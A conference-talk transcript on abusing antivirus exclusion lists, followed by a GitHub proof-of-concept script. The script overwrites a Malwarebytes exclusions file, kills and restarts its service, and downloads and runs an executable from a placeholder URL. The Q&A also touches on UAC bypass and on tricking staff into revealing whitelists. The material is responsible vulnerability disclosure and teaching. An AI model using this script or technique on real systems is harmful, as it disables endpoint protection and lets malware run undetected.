=== Content from www.youtube.com_49c3a7aa_20250125_165546.html ===
[00:00] is that good no they're perfect even
[00:01] better okay so yeah my name is Michael
[00:04] spalling I work at the University of
[00:06] Alberta up in Edmonton Canada and if
[00:09] you've never done security at a large
[00:11] research university things things get
[00:13] pretty interesting one of these that we
[00:14] joke about is our production networks
[00:17] are just a bad guys test environments
[00:18] and despite joking about that it's the
[00:20] sad reality of it I've been there for
[00:23] about six years mostly in a security
[00:25] operations role I work on a small team
[00:27] that's responsible for things like
[00:28] firewalls intrusion prevention systems
[00:31] incident response a shameless plug but a
[00:34] lot of that actually gonna be changing
[00:35] about three weeks ago I accepted a
[00:37] promotion to team lead so now I'm gonna
[00:39] be leading the team that I've been
[00:41] working on in security for the last six
[00:43] years so looking forward to whatever
[00:45] opportunities that that brings up and
[00:48] you know I got kind of interested in
[00:50] vulnerabilities and exploits a little
[00:51] over a year ago I attended a conference
[00:53] in Vancouver called Cannes a quest and
[00:55] it just blew my mind wide open in
[00:58] regards to what what can actually go
[00:59] wrong with a computer and what people
[01:01] are really capable of hacking and ever
[01:03] since then I was like I that's
[01:04] interesting I really want to get
[01:05] involved in this so I started kind of
[01:07] digging around and one of the things
[01:09] that I did last year is gonna be the
[01:10] presentation of ORS what I'm presenting
[01:12] now and yeah it's also my first national
[01:14] talk I've done quite a bit of talks at
[01:15] the University campus and just a local
[01:18] user groups in Edmonton but this is my
[01:19] first time talking at a conference like
[01:22] this so really excited and on the bottom
[01:24] those those are things I like if you
[01:25] like those things too then there's
[01:27] things to talk about and the picture if
[01:29] anybody plays a World of Warcraft that's
[01:31] proof that my wife actually let me bring
[01:33] Frostmourne to our wedding and get it in
[01:35] the photos so there we go so this is
[01:38] just a quick agenda here's here's what
[01:40] we're gonna talk about a little bit
[01:41] about just some background really why
[01:43] why you should care about this whitelist
[01:45] abuse is actually kind of cool and fun I
[01:46] think and then we're gonna go on a
[01:48] whitelisting tour so I'll show you guys
[01:50] what I've been covering in different
[01:52] security products in the last year
[01:54] not necessarily vulnerabilities in a lot
[01:56] of them but just just differences and
[01:59] really what it comes down to is that
[02:00] everything is done differently there
[02:01] really are no standards or agreed-upon
[02:03] best practices for how to implement the
[02:05] whitelist so you'll see that pretty
[02:06] quickly when it's dine me I'm going to
[02:09] end the white listing tour on one
[02:10] specific issue that I found in two
[02:12] products that I'm then going to
[02:13] demo so I've got a live demo plan
[02:16] there's a VM setup here so if any of you
[02:18] have beer just chug it now for the demo
[02:19] gods because it's probably gonna go to
[02:21] hell and the second one is pre-recorded
[02:23] the first one is against the product
[02:26] called as a mana ante lager maybe you
[02:27] guys are familiar with it
[02:28] the second one is against malwarebytes
[02:30] so I disclosed this issue to
[02:32] malwarebytes last year they paid a
[02:34] thousand dollar bounty for it and I'll
[02:36] show you guys what happens so I thought
[02:38] that was pretty neat and if there's time
[02:39] we'll do a Q&A at the end so if if
[02:43] you're interested in this type of stuff
[02:44] there is some research going on this
[02:45] area to people notably typhus or Mandi
[02:48] from Google's project zero and oxygen
[02:50] Cora these guys have been doing some
[02:52] really really interesting things with
[02:53] breaking security software so it's not
[02:57] unexpected but I think it's hilarious
[02:58] that the actual software that's designed
[03:00] to protect you in itself has flaws that
[03:03] can actually lead to your own compromise
[03:05] so follow these guys and read up some of
[03:07] the research it's really cool to what
[03:08] they were doing the other thing that's
[03:10] out there are just white listing
[03:11] products so things like a blocker McAfee
[03:14] application control what what these
[03:16] software is designed to do is instead of
[03:17] focusing on what is bad and identifying
[03:19] that I'm blocking it where these
[03:21] programs you just define what's good and
[03:23] then only good is permitted everything
[03:25] else is is is restricted so I thought to
[03:28] myself when I wanted to start getting
[03:30] involved in this area what if I just
[03:32] combine those two let's just start there
[03:34] you got to start somewhere so what if I
[03:36] just started by looking for
[03:38] vulnerabilities in security products
[03:41] ability to whitelist and it turns out
[03:43] there are actually that's that's a thing
[03:46] so first of all why why should we care
[03:49] why even abused whitelist in the first
[03:50] place
[03:51] pretty straightforward whoever controls
[03:53] that whitelist controls what's permitted
[03:54] right that's that's something that
[03:56] should only be done by a trusted user or
[03:58] a system administrator or something
[04:00] you're bad guys should not be able to
[04:01] control your whitelist if a bad guy
[04:03] controls your whitelist they control
[04:05] what's permitted into your environments
[04:06] and now you've got a problem so how are
[04:10] we going to be doing this well we're
[04:12] gonna start looking for potential why
[04:13] are weaknesses in whitelisting
[04:16] implementations and when we find one
[04:18] believe it or not it's actually possible
[04:20] in some cases to replace the white list
[04:23] with a white list of our own and I'll
[04:26] show you I'll show you that go
[04:27] on here so the only tool you need to do
[04:29] this to really get started is process
[04:31] monitor if you've never used process
[04:33] monitor grab it at that length this is
[04:35] what it looks like
[04:35] it's it's just a piece of software that
[04:37] runs on Windows and it's a it tells you
[04:40] everything that's going on so it looks
[04:42] like your process is and it tells you
[04:43] what files are being read and written to
[04:45] registry Keys being read and written to
[04:46] a bunch of networking things this this
[04:49] this is all you need so the idea is to
[04:53] install a piece of antivirus software
[04:55] you want to poke at have it detect a
[04:57] threat and when it says to you hey
[04:59] here's this threat what do you want to
[05:01] do permit deny you know accept ignore
[05:03] turn-on process monitor accept the
[05:06] threat so it gets entered into your
[05:07] whitelist and then turn off process
[05:09] monitor and it will show you what
[05:11] exactly the antivirus software or
[05:13] software did in the background
[05:15] to modify its light list so these are
[05:18] some examples that I have here if you
[05:19] can't see them in the back I apologize
[05:21] the problem with doing that though is
[05:23] that sometimes it can generate up to
[05:24] 5,000 lines of entries so this is where
[05:26] the bulk of the work is it's actually
[05:27] digging through these lines searching
[05:29] trying to find usually that literally
[05:31] one line that reveals where the
[05:33] whitelist is located so the top one is
[05:35] McAfee I think it's endpoint protection
[05:37] 2015 and I was able to find that eight
[05:41] rights to a registry key that was
[05:43] revealed by process monitor the bottom
[05:46] one is sofas cloud security and it
[05:49] actually writes that something called
[05:50] Machine XML so what I learned over a
[05:54] year are poking out various products is
[05:56] there there is there is no rhyme or
[05:58] reason to how whitelist are implemented
[06:00] everyone's doing it differently so this
[06:02] is just a tour what I found so semana
[06:04] anti logger their whitelist is stored in
[06:07] app data and a locally logged on user a
[06:09] bunch of them have them in various
[06:10] program data locations some of them just
[06:12] simply write registry keys if you look
[06:14] at the actual file types
[06:16] we've got ini files dat files XML files
[06:19] plain old straight-up txt files web root
[06:22] I thought was interesting because they
[06:24] actually have two white lists the the
[06:26] white list that permits malicious URLs
[06:29] is stored in a text file in the file
[06:32] system whereas the white list that
[06:34] permits malicious files is stored in a
[06:36] registry key so not that I think there's
[06:39] anything wrong or bad with that is just
[06:40] a
[06:40] example of someone doing it differently
[06:42] so the next step is if you go and dig
[06:47] around in these files figure out the
[06:48] structure and what exactly they look
[06:50] like and this this is the same thing
[06:52] there there's a no rhyme or reason here
[06:53] it's all different this is from sophist
[06:56] cloud security they edit something
[06:58] called machine dot XML which is actually
[07:00] a very large configuration file so it
[07:03] contains the white list amongst a whole
[07:05] bunch of other things but the important
[07:07] thing to notice is that there's actually
[07:08] three separate ones so the white list
[07:10] for on access scan on demand scan and
[07:12] right click scan are actually controlled
[07:14] independently so if someone wants to go
[07:16] and actually manipulate as an attack or
[07:17] someone's whitelist
[07:18] understand what software they're using
[07:20] and understand how their configurations
[07:21] are set up because if you accidentally
[07:23] permit your threat by modifying only
[07:26] right-click it's still gonna get caught
[07:27] by on demand and on access and then
[07:29] here's one of the failures um if you
[07:32] look at the act what's actually in the
[07:33] file the only thing that's in here is
[07:35] the name of the file from cloud exe so
[07:38] I'm not going to go on record and say it
[07:40] was sophist I did come across the
[07:42] product pretty sure it was a time where
[07:44] the name of the file is all that's in
[07:46] the white list it doesn't look for
[07:48] anything else it doesn't look for where
[07:49] the file is located
[07:50] it doesn't look for a hash it just looks
[07:52] for the name of the file and if that
[07:54] file is found anywhere on the file
[07:56] system it's permitted to run so I took
[07:58] NJ rat renamed it something like michael
[08:00] dot exe permitted michael d XE + NJ rat
[08:03] would run on the system anywhere simply
[08:06] because we we had just permitted a name
[08:09] so this is extra interesting because if
[08:11] you're an attacker and you can convince
[08:13] someone to give up your whitelist and
[08:14] their software works in this manner you
[08:16] don't even have to modify the whitelist
[08:17] all you got to do is rename your threat
[08:19] to something that's already in the
[08:20] whitelist and it'll just it'll just come
[08:22] on in which is pretty cool or terrible
[08:24] depending on your point of view this is
[08:28] this thing's getting a little better
[08:29] this is McAfee McAfee did the same thing
[08:31] they just looked at the name but they
[08:32] also went and put the location on here
[08:35] so in this case malware dot exe my
[08:37] generic test this this will only get
[08:39] blocked if it's found in this location
[08:41] anywhere also in the file system it will
[08:43] continue to run pretty straightforward
[08:46] this was the web root text file it's
[08:48] literally a text file with just URLs
[08:49] appended to it if if you tinker with it
[08:52] enough and you just remove
[08:54] some of the if you overwrite some of the
[08:55] permissions on the file I was able to
[08:57] just manually edit this directly and
[08:59] have the changes here reflect in the and
[09:01] the software not really a huge problem
[09:03] but there you have it and then and then
[09:05] we get a little better so this is web
[09:07] roots and this is their their file
[09:09] hashing so if you permit something
[09:12] through web root what actually does it
[09:14] just has the hash one here that's it so
[09:15] if the hash changes the file will get
[09:17] caught once again doesn't care where in
[09:18] the file system it is long as the hash
[09:20] matches but one thing that's interesting
[09:22] is their whitelist
[09:23] doesn't just control malware it also
[09:24] controls protected applications so if
[09:27] you're protected app is in here I
[09:28] believe the way it works is that the
[09:30] software will prevent any changes to it
[09:31] so if you can inject into this whitelist
[09:34] make sure to set protected app to yes
[09:36] and then nothing will actually be able
[09:38] to touch your your threat which I
[09:40] thought was pretty neat the last thing
[09:42] and this is this is where the fun begins
[09:44] and the demo is kind of kick in is every
[09:46] now and then this happens and I found
[09:48] this twice now is some developers I'm
[09:51] going to assume thought to themselves
[09:53] that hey we're going to encrypt these
[09:55] these these and malware sorry these
[09:58] whitelist files and because they're
[09:59] encrypted they can't be tampered with so
[10:01] everything's a-okay and then I learned
[10:03] as I was playing around with them that
[10:05] that key that they used to encrypt and
[10:07] decrypt the file is actually hard-coded
[10:09] into the application so every single
[10:11] installation of these two products can
[10:14] read and write any any configuration
[10:16] file or any exclusions file from any
[10:18] other installation so don't do that
[10:22] there's actually two other issues here
[10:24] and this this is where it's the first
[10:27] and second bonus has come in is those
[10:29] exclusion files if you look at the
[10:31] properties the permissions and the
[10:32] properties full control in both cases
[10:34] was granted to the locally logged on not
[10:37] administrative user so now we have a
[10:39] file that's been encrypted with a hard
[10:41] coded key that can be model eated copied
[10:45] overwritten by the locally logged on
[10:47] user and there's also no right lock on
[10:50] it so you can as long as the programs
[10:52] running you can still just rate up
[10:53] delete these files and you know
[10:54] different things happen if there's no
[10:56] file there it might recreate it or do
[10:57] something but this this actually opens
[10:59] the door for some pretty interesting
[11:01] malicious abuse so what I decided to do
[11:04] is I did not go through the effort of
[11:06] actually trying to figure out
[11:07] um what the key was in the case of
[11:10] malwarebytes you guys I mentioned Tavis
[11:13] or Mandi earlier I've never met the guy
[11:14] but I disclosed this to them in
[11:16] September and about two months later he
[11:19] disclosed it but to them as well because
[11:21] he found the same thing but he actually
[11:22] went through the effort of figuring what
[11:24] is that key and he found it and he was
[11:26] able to then decrypt the files and
[11:28] figure out a lot of structural issues
[11:30] within the files that could potentially
[11:31] lead to code execution amongst a bunch
[11:34] of other things so what I decided to do
[11:36] is just create a new thread or create a
[11:40] new whitelist from a completely
[11:42] different installation and copy it over
[11:44] and so all I did is I grabbed the trial
[11:47] version a different computer oh that's
[11:49] that's one of the interesting things
[11:50] here is the trial versions for all of
[11:51] the software that I've been testing also
[11:54] has that same key in it so whether using
[11:55] a trial version or full paid product
[11:57] doesn't matter that same key is
[11:59] hard-coded so you don't even have to
[12:01] invest in the product this literally
[12:02] cost you nothing financially to go and
[12:04] poke with you don't have to pay them
[12:05] fifty dollars or 60 bucks for their
[12:07] product get the free trial version once
[12:09] you have that you install it and have
[12:11] the trial version detect your threat and
[12:14] then you take that and when the
[12:15] threatened when the version says hey do
[12:17] you want to permit this your answer is
[12:19] yeah sure do and then you have a
[12:21] wonderful new version of the whitelist
[12:24] which you can then move to your target
[12:25] machine overwrite their whitelist and
[12:27] the net result is the system will permit
[12:30] your threat so I'm gonna move the demo
[12:32] time here I'm gonna request that we turn
[12:34] the camera off that's a cue not not
[12:37] because what you're going to see is
[12:38] absolutely crazy or anything it's just I
[12:41] am here as a representative of the
[12:42] University of Alberta I'm not
[12:43] representing myself and I do have some
[12:45] professional standards I have to adhere
[12:46] to according to them both of these
[12:48] issues they're they're not fixed this
[12:51] actually works on the most version build
[12:53] of Malwarebytes
[13:02] you
[20:34] I mean when I talk about this type of
[20:35] thing with coworkers and friends is
[20:38] everybody like I should say nobody I'm
[20:41] sure you guys all understand this under
[20:43] really no the type of work and failure
[20:46] that goes into these types of exploits
[20:47] right I'm standing here 20 minutes
[20:49] showing you to what I think are cool
[20:50] exploits against two products but the
[20:52] reality is there was a lot of failure
[20:54] involved in getting it to the point
[20:56] where I can confidently talk about it
[20:57] and have it work in a demo right failure
[20:59] after failure after failure so things
[21:01] that didn't work i've yet to actually
[21:04] see a product we're just editing the
[21:05] files directly immediately reflects in
[21:09] the application i always have to seem to
[21:11] restart a process or a service so where
[21:14] I plan on going from here or if any of
[21:15] you guys want to do this ourselves it's
[21:17] trying to find a way to do this that
[21:18] makes those those changes take effect
[21:21] immediately
[21:22] without having to resort to resetting
[21:23] stuff that's one of the biggest thing
[21:25] what's next I would encourage all of you
[21:27] do try this at home
[21:28] I think it's pretty pretty cool
[21:29] interesting neat stuff one note though
[21:32] is self-protection modules do stop this
[21:34] every single time I've never seen a
[21:36] program we're turning on the self
[21:38] protection module allows me to then
[21:39] overwrite a whitelist the problem is
[21:42] that in many cases are actually turned
[21:43] off by default some companies also lock
[21:46] their self protection module behind a
[21:47] paywall where you don't get it in the
[21:49] basic service you got to buy the premium
[21:51] version of that I think if they're
[21:52] really interested in actually protecting
[21:54] you that type of functionality should
[21:56] just be in the base product some
[21:58] companies do but not everyone does so
[22:00] far I that step in when I put
[22:01] this slide together I poked at seven
[22:03] different products three of which are
[22:04] vulnerable to my demo today virustotal
[22:07] has over fifty different products on
[22:09] their list at some point in the future
[22:11] or if anyone wants to help just pick one
[22:13] and go through it and see if this type
[22:15] of issue is present if it is reported
[22:17] you know you might even get money out of
[22:18] it who knows and it's pretty simple
[22:20] processing tools right I don't I don't
[22:22] have a degree in computing science I'm a
[22:24] really really really terrible programmer
[22:26] but I just even I was able to figure
[22:28] this stuff out so if you're sort of new
[22:29] to this and you want to get involved
[22:31] this is a really great place to start
[22:32] looking guide process monitor grab some
[22:33] time and start there so one last slide
[22:36] and that's just huge thanks to three key
[22:39] people first off University of Alberta
[22:41] just we're really putting up with me and
[22:42] all the opportunities
[22:43] secondly to Totem coffee I don't think
[22:45] she's in the room but Megan and I
[22:47] actually
[22:47] it's virtually back in January of this
[22:49] year in our professional lives and I
[22:52] told her over the phone one afternoon
[22:54] that hey you know I've been doing some
[22:55] work that I would love to share with
[22:57] people and she says well I I know this
[22:59] thing is it's called proving grounds
[23:01] call for presentations is going out and
[23:03] you should submit one and hope for the
[23:04] best
[23:05] Here I am so had that conversation never
[23:07] happened I owe her immense amount of
[23:09] gratitude and finally Cerrito reaches on
[23:11] the very back row they're looking at
[23:12] this phone with his pink hair Rachel was
[23:15] my mentor for this absolutely absolutely
[23:17] awesome
[23:18] I can't even begin to really put into
[23:22] words how amazing you've been I looked
[23:24] at my original presentation I gave you
[23:25] like five months ago and I look at this
[23:27] one and so much of what you have said
[23:29] and guided me on is reflected in here so
[23:31] thank you and I would I would encourage
[23:32] you to continue to mentor here whoever
[23:35] whoever gets you honestly is incredibly
[23:36] lucky and yeah thank you very much so
[23:39] that's that's what I got said and I
[23:41] think we got like two point two minutes
[23:42] I think so question
[23:50] good stuff Michael thank you questions
[24:03] at one point you were showing hashes I
[24:06] think you had ink and something uh DXE
[24:09] did you figure out what method they were
[24:11] using the hash and was it just hashing
[24:13] the path in almost every scenario md5
[24:20] hash and it is just hashing the
[24:21] executable it's one has been a path or
[24:22] anything your to demo is need and
[24:30] administrator and I want to know if we
[24:33] don't have administrator and we need to
[24:37] bypass the USD and I want how I want to
[24:40] know you how to deal with it if I knew
[24:44] the answer to that I would totally tell
[24:46] you right now I have no idea how to
[24:50] bypass Windows UAC at this point one
[24:52] thing that I do know is that Microsoft
[24:53] doesn't consider you AC to be a security
[24:56] measure I've been reading up on some
[24:58] issues with that and people have
[24:59] disclosed to them though
[25:01] abilities and getting around it and they
[25:03] I don't think they pay bounties for it
[25:04] because they don't consider it to be a
[25:05] security bypassed how to do it not not
[25:09] my area of expertise unfortunately oh
[25:12] actually generally we we want to bypass
[25:16] the USC we will yo you seen till
[25:19] ingestion and in judgment in to explore
[25:22] and use extra e and get administrator so
[25:29] the proteins will make antivirus to
[25:35] detach the ingestion okay so if you can
[25:39] even send me an email with that that'd
[25:41] be really cool I like looking enough
[25:42] further thanks any man great talk again
[25:45] did you talk it all about oh do you
[25:48] research cleaning up after yourself so
[25:50] it would be easy enough just to rewrite
[25:51] the file once you're done is that
[25:53] something yeah I've never actually
[25:55] considered doing that a lot of a lot of
[25:58] where I've kind of put thought in that
[25:59] area is where would something that's
[26:01] really be useful that's kind of where I
[26:03] stopped is once I once it's useful
[26:05] cleaning up after yourself yeah that's a
[26:07] good point I get some theory sure you
[26:08] could definitely just put the original
[26:10] whitelist back or put a clean one there
[26:11] one of the questions that I that I've
[26:14] had and I show like just friends this
[26:15] kind of tied into that is usually they
[26:17] say if you can just um you can just shut
[26:21] down the program why even bother going
[26:23] further with the whitelist abuse and my
[26:25] answer is well it really depends on what
[26:27] what you're doing as an attacker right
[26:29] if your goal is to get in get your stuff
[26:30] and get out then there's no knees and to
[26:33] really clean up or anything by the time
[26:34] you have what you need you're long gone
[26:35] I think something like this would
[26:37] probably be beneficial if you're going
[26:38] for persistence and you want your threat
[26:40] to stay there as undetected as long as
[26:43] possible
[26:43] I've actually encountered that real life
[26:45] where we were one of my former jobs was
[26:49] to manage the antivirus console for a
[26:50] large oil company in northern Alberta
[26:52] about fifty five hundred workstations
[26:53] and every morning I'd get a report that
[26:55] showed all the systems that were turned
[26:57] on that never actually talked home to
[27:00] the antivirus mothership and had to
[27:02] figure out why and in one case it was
[27:04] because antivirus got on there and
[27:06] disabled the product if they had just
[27:08] whitelisted themselves we probably never
[27:10] would have found it so yeah I've haven't
[27:12] really put much thought into cleaning up
[27:14] my focus
[27:15] let's just screw with it and talk about
[27:18] it that way
[27:19] Thanks so one more question between you
[27:21] and lunch anyone so would it be an
[27:30] oversimplification to just make an
[27:32] educated guess of processes that are
[27:35] applications that are most likely to be
[27:37] whitelisted and launch a campaign based
[27:39] on that like notepad dot exe and yeah
[27:42] hope for the best
[27:43] yeah probably so things like notepad
[27:44] Explorer whatever random obscure thing
[27:47] might be out there
[27:48] unnecessary and obscure but yeah I think
[27:49] you could you could do that where other
[27:52] my thoughts have also been is how much
[27:54] effort do you want to put into like how
[27:56] much research you want to put into your
[27:57] target if you know they're using this
[27:58] particular probably program you know the
[28:00] white list works like this where my
[28:02] thoughts are mostly stopped it's also
[28:04] engineering find a target interesting
[28:05] hey I'm so-and-so from IT can you send
[28:07] me a screenshot of this have a send it
[28:10] to you and then you have the white list
[28:11] the but yeah I think it would probably
[28:13] work just white list generic things and
[28:15] hope for the best you alright thank you
[28:22] everyone for coming I hope you enjoy the
[28:25] talk thank you Michael

=== Content from github.com_a0d36072_20250125_165546.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmspaling%2Fmbam-exclusions-poc-%2Fblob%2Fmaster%2Fmbam-whitelist-poc.txt)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmspaling%2Fmbam-exclusions-poc-%2Fblob%2Fmaster%2Fmbam-whitelist-poc.txt)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mspaling%2Fmbam-exclusions-poc-)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mspaling](/mspaling)
/
**[mbam-exclusions-poc-](/mspaling/mbam-exclusions-poc-)**
Public

* [Notifications](/login?return_to=%2Fmspaling%2Fmbam-exclusions-poc-) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fmspaling%2Fmbam-exclusions-poc-)
* [Star
   0](/login?return_to=%2Fmspaling%2Fmbam-exclusions-poc-)

* [Code](/mspaling/mbam-exclusions-poc-)
* [Issues
  0](/mspaling/mbam-exclusions-poc-/issues)
* [Pull requests
  0](/mspaling/mbam-exclusions-poc-/pulls)
* [Actions](/mspaling/mbam-exclusions-poc-/actions)
* [Projects
  0](/mspaling/mbam-exclusions-poc-/projects)
* [Security](/mspaling/mbam-exclusions-poc-/security)
* [Insights](/mspaling/mbam-exclusions-poc-/pulse)

Additional navigation options

* [Code](/mspaling/mbam-exclusions-poc-)
* [Issues](/mspaling/mbam-exclusions-poc-/issues)
* [Pull requests](/mspaling/mbam-exclusions-poc-/pulls)
* [Actions](/mspaling/mbam-exclusions-poc-/actions)
* [Projects](/mspaling/mbam-exclusions-poc-/projects)
* [Security](/mspaling/mbam-exclusions-poc-/security)
* [Insights](/mspaling/mbam-exclusions-poc-/pulse)

## Files

 master
## Breadcrumbs

1. [mbam-exclusions-poc-](/mspaling/mbam-exclusions-poc-/tree/master)
/
# mbam-whitelist-poc.txt

Copy path Blame  Blame
## Latest commit

## History

[History](/mspaling/mbam-exclusions-poc-/commits/master/mbam-whitelist-poc.txt)41 lines (40 loc) · 2.34 KB master
## Breadcrumbs

1. [mbam-exclusions-poc-](/mspaling/mbam-exclusions-poc-/tree/master)
/
# mbam-whitelist-poc.txt

Top
## File metadata and controls

* Code
* Blame

41 lines (40 loc) · 2.34 KB[Raw](https://github.com/mspaling/mbam-exclusions-poc-/raw/refs/heads/master/mbam-whitelist-poc.txt)1234567891011121314151617181920212223242526272829303132333435363738394041#Proof-of-concept script to take demonstrate incorrect permissions and hardcoded asymmetric encryption in Malwarebytes 2.2.1 and prior. Fixed in 3.0.4. Provide your own exclusions.dat#By Michael Spaling - provided as-is. Use at your own risk.#http://www.securitytube.net/video/16690
import socketimport urllibimport osimport shutilimport subprocessimport win32serviceutilimport time#User prompt to prevent the app from auto running the first test.raw\_input("Press enter to deliver the exploit")#Overwrites a valid version of exclusions.dat with a malicious version of exclusions.dat that whitelists 7ZipSetup.exe and image6.putlocker.is both of which where blocked by Malwarebytes at the time of disclosureshutil.copy('exclusions.dat', 'C:\\ProgramData\\Malwarebytes\\Malwarebytes Anti-Malware\\exclusions.dat')#Restarts malware processes to force new whitelist to take affect.os.system('taskkill /f /im mbam.exe')servicename = 'MBAMService'subprocess.call('taskkill /f /fi "services eq %s"' % servicename)time.sleep(5)win32serviceutil.StartService(servicename)#User prompt to prevent the app from auto running the first test.raw\_input("Press enter to initiate a malicious TCP connection")#initiates TPC connection on port 80 to image6.putlocker.is. This domain is blacklisted by Malwarebytes Web Protect but will now be accessible.target\_host = "image6.putlocker.is"target\_port = 80client = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)client.connect((target\_host,target\_port))#determines content of the HTTP request. It's a GET request for the root index of image6.putlocker.isclient.send("GET / HTTP/1.1\r\nHost: image6.putlocker.is\r\n\r\n")#Record the data that's recieved up to a maximum of 4096 bytes and display it's content. This will be HTML code.response = client.recv(4096)print response#User prompt to prevent the app from auto running the second test.raw\_input("Press enter to download and run malware. Malware will open outside this window.")#Downloads a bundled version of 7ZipSetup.exe from a webserver and saves in C:\. This file is blacklisted by Malwarebytes Malware Protect but will now be executed.urllib.urlretrieve ("http://YOURURLHERE/7ZipSetup.exe", "C:\\7ZipSetup.exe")#Runs 7ZipSetup.exeos.system("C:\\7ZipSetup.exe")#User prompt to prevent this app from auto closing.raw\_input("Press enter to exit this program")

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_f9c65ede_20250125_165544.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmspaling%2Fmbam-exclusions-poc-)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

